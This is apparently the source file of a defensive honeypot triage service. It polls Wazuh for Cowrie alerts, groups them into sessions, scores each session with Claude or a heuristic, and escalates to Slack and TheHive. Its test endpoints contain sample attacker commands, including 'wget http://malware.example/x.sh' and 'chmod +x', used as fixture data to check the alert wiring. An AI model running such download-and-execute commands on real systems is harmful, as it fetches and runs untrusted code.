"""Tripwire triage service (Phase 3).

Loop: poll the Wazuh indexer for new Cowrie alerts → group into sessions →
when a session closes (or goes idle past the grace period) enrich its source IP,
ask Claude for a summary + notability score, and upsert the row into Supabase.
"""
from __future__ import annotations

import asyncio
import contextlib
from datetime import datetime, timedelta, timezone
from pathlib import Path

from fastapi import FastAPI

from config import settings
from wazuh_client import WazuhIndexerClient
from sessions import group_sessions
from enrichment import enrich_ip
from claude_client import triage_session
from supabase_writer import upsert_session
import slack_notify
import thehive_client

_STATE_FILE = Path(__file__).parent / ".state_since"

state = {
    "processed_total": 0,
    "triaged_by_ai": 0,          # sessions worth a Claude call
    "triaged_heuristically": 0,  # trivial scans summarised without the LLM
    "pending": 0,
    "last_error": None,
}
_pending: dict[str, dict] = {}
_processed: set[str] = set()


def _parse_ts(ts: str) -> datetime:
    return datetime.fromisoformat(ts.replace("Z", "+00:00"))


def _load_since() -> str:
    if _STATE_FILE.exists():
        return _STATE_FILE.read_text().strip()
    return (datetime.now(timezone.utc) - timedelta(minutes=10)).isoformat()


def _save_since(iso: str) -> None:
    _STATE_FILE.write_text(iso)


def _merge(new: dict[str, dict]) -> None:
    for sid, s in new.items():
        p = _pending.get(sid)
        if p is None:
            _pending[sid] = s
            continue
        p["source_ip"] = p["source_ip"] or s["source_ip"]
        p["protocol"] = p["protocol"] or s["protocol"]
        p["usernames_tried"] = list(dict.fromkeys(p["usernames_tried"] + s["usernames_tried"]))
        p["passwords_tried"] = list(dict.fromkeys(p["passwords_tried"] + s["passwords_tried"]))
        p["commands_tried"] = p["commands_tried"] + s["commands_tried"]
        p["started_at"] = p["started_at"] or s["started_at"]
        p["ended_at"] = s["ended_at"] or p["ended_at"]
        p["closed"] = p["closed"] or s["closed"]
        p["high_signal"] = p["high_signal"] or s["high_signal"]
        if s["first_ts"] and (not p["first_ts"] or s["first_ts"] < p["first_ts"]):
            p["first_ts"] = s["first_ts"]
        if s["last_ts"] and (not p["last_ts"] or s["last_ts"] > p["last_ts"]):
            p["last_ts"] = s["last_ts"]


def _heuristic(s: dict, enr: dict) -> tuple[str, list[str], int, str, str]:
    """Disposition a trivial session without spending an LLM call.

    The honeypot is scanned continuously and the overwhelming majority of
    sessions are a bare connect or one failed login. Those are always
    notability 1, so paying for a Claude call on each is wasted spend. We still
    give them the same verdict + action fields an analyst would record.
    Returns: (summary, techniques, score, verdict, recommended_action).
    """
    proto = (s.get("protocol") or "ssh").upper()
    where = enr.get("country") or "an unknown location"
    tried = len(s.get("usernames_tried") or [])
    if tried:
        return (
            f"Automated {proto} login scan from {s['source_ip']} ({where}). Tried "
            f"{tried} credential pair(s) and disconnected without running any commands.",
            ["T1110: Brute Force"],
            1,
            "reconnaissance",
            "monitor",
        )
    return (
        f"Bare {proto} connection from {s['source_ip']} ({where}) with no login "
        f"attempt — port scan or banner grab.",
        ["T1595: Active Scanning"],
        1,
        "noise",
        "dismiss",
    )


async def _process(s: dict) -> None:
    ip = s.get("source_ip")
    if not ip:
        return  # schema requires source_ip
    enr = await enrich_ip(ip)

    # Only spend a Claude call when the attacker actually did something.
    if s.get("commands_tried") or s.get("high_signal"):
        triage = await triage_session({**s, **enr})
        summary, techniques, score = triage.summary, triage.mitre_techniques, triage.notability_score
        verdict, action = triage.verdict, triage.recommended_action
        state["triaged_by_ai"] += 1
    else:
        summary, techniques, score, verdict, action = _heuristic(s, enr)
        state["triaged_heuristically"] += 1
    row = {
        "cowrie_session": s["cowrie_session"],
        "source_ip": ip,
        "country": enr.get("country"),
        "asn": enr.get("asn"),
        "protocol": s.get("protocol"),
        # started_at is NOT NULL in the schema; fall back to the first event we
        # saw when the session's connect event predates our polling window.
        "started_at": s.get("started_at") or s.get("first_ts"),
        "ended_at": s.get("ended_at"),
        "usernames_tried": s.get("usernames_tried"),
        "passwords_tried": s.get("passwords_tried"),
        "commands_tried": s.get("commands_tried"),
        "abuseipdb_score": enr.get("abuseipdb_score"),
        "vt_malicious_count": enr.get("vt_malicious_count"),
        "mitre_techniques": techniques,
        "ai_summary": summary,
        "ai_notability_score": score,
        "verdict": verdict,
        "recommended_action": action,
    }
    await asyncio.to_thread(upsert_session, row)
    state["processed_total"] += 1
    tag = "ai " if (s.get("commands_tried") or s.get("high_signal")) else "fast"
    print(f"[{tag}] {ip} score={score} {verdict}/{action}: {summary[:70]}")

    disp = {"verdict": verdict, "recommended_action": action}
    # SOAR tier 1: escalate high-notability attackers to Slack (no-op if unset).
    await slack_notify.notify(s, enr, summary, techniques, score, disp)
    # SOAR tier 2: open a TheHive case for the same (no-op if unset).
    case_id = await thehive_client.create_case(s, enr, summary, techniques, score, disp)
    if case_id:
        print(f"[thehive] opened case {case_id} for {ip}")


async def _flush() -> None:
    grace = timedelta(seconds=settings.session_grace_seconds)
    now = datetime.now(timezone.utc)
    ready = [
        sid for sid, s in _pending.items()
        if s["closed"] or (s["last_ts"] and now - _parse_ts(s["last_ts"]) > grace)
    ]
    for sid in ready:
        s = _pending.pop(sid)
        if sid in _processed:
            continue
        try:
            await _process(s)
            _processed.add(sid)
        except Exception as e:  # noqa: BLE001
            state["last_error"] = f"process {sid}: {e}"
            print(state["last_error"])


async def poll_loop() -> None:
    wz = WazuhIndexerClient(
        settings.wazuh_indexer_url, settings.wazuh_indexer_user, settings.wazuh_indexer_password
    )
    since = _load_since()
    try:
        while True:
            try:
                alerts = await wz.new_cowrie_alerts(since)
                if alerts:
                    _merge(group_sessions(alerts))
                    newest = max((a.get("timestamp") for a in alerts if a.get("timestamp")), default=since)
                    since = newest
                    _save_since(since)
                await _flush()
                state["pending"] = len(_pending)
                state["last_error"] = None  # a clean cycle clears the last error
            except Exception as e:  # noqa: BLE001
                # str(e) is empty for some httpx errors (e.g. timeouts), so
                # include the type name to keep the message useful.
                state["last_error"] = f"poll: {type(e).__name__}: {e}"
                print(state["last_error"])
            await asyncio.sleep(settings.poll_interval_seconds)
    finally:
        await wz.aclose()


@contextlib.asynccontextmanager
async def lifespan(app: FastAPI):
    task = asyncio.create_task(poll_loop())
    yield
    task.cancel()
    with contextlib.suppress(asyncio.CancelledError):
        await task


app = FastAPI(title="Tripwire Triage Service", lifespan=lifespan)


@app.get("/health")
async def health() -> dict:
    return {"status": "ok", **state}


@app.post("/test-slack")
async def test_slack() -> dict:
    """Fire a sample high-notability alert to verify the Slack wiring, without
    waiting for a real score-5 attacker."""
    await slack_notify.notify(
        {"source_ip": "203.0.113.7", "commands_tried": ["uname -a", "wget http://malware.example/x.sh", "chmod +x x.sh"]},
        {"country": "Testland", "asn": "AS0 Example", "abuseipdb_score": 100, "vt_malicious_count": 9},
        "TEST MESSAGE — simulated notable attack to confirm Slack escalation is wired up.",
        ["T1105: Ingress Tool Transfer", "T1059: Command and Scripting Interpreter"],
        5,
        {"verdict": "malicious", "recommended_action": "block"},
    )
    return {"sent": bool(settings.slack_webhook_url), "threshold": settings.slack_notify_threshold}


@app.post("/test-thehive")
async def test_thehive() -> dict:
    """Open a sample TheHive case to verify the wiring without waiting for a
    real score-5 attacker."""
    case_id = await thehive_client.create_case(
        {"source_ip": "203.0.113.7", "commands_tried": ["uname -a", "wget http://malware.example/x.sh", "chmod +x x.sh"]},
        {"country": "Testland", "asn": "AS0 Example", "abuseipdb_score": 100, "vt_malicious_count": 9},
        "TEST CASE — simulated notable attack to confirm TheHive case creation is wired up.",
        ["T1105: Ingress Tool Transfer", "T1059: Command and Scripting Interpreter"],
        5,
        {"verdict": "malicious", "recommended_action": "block"},
    )
    return {"enabled": bool(settings.thehive_api_key), "case_id": case_id}


@app.post("/test-thehive-resolve")
async def test_thehive_resolve() -> dict:
    """Open a routine (monitor) case to verify the auto-resolve lifecycle path."""
    case_id = await thehive_client.create_case(
        {"source_ip": "203.0.113.8", "commands_tried": ["uname -a", "cat /proc/cpuinfo"]},
        {"country": "Testland", "asn": "AS0 Example"},
        "TEST CASE — routine reconnaissance, should be auto-resolved.",
        ["T1082: System Information Discovery"],
        3,
        {"verdict": "reconnaissance", "recommended_action": "monitor"},
    )
    return {"enabled": bool(settings.thehive_api_key), "case_id": case_id}
